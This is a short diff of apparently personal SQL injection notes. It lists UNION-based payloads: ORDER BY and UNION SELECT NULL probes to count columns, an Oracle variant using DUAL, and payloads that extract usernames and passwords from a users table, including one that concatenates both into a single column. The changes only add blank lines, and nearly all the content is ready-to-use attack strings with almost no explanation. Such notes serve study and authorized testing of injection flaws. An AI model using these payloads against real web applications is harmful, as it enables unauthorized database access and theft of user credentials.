@@ -10,8 +10,11 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 ' ORDER BY 2--
 
 ' ORDER BY 3--
+
 ETC.
+
 OR
+
 ' UNION SELECT NULL--
 
 ' UNION SELECT NULL,NULL--
@@ -31,7 +34,9 @@ BUT ON ORACLE   ' UNION SELECT NULL FROM DUAL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 
 4-)
+
 ' UNION SELECT username, password FROM users--
 
 and single column
+
 ' UNION SELECT username || '~' || password FROM users--
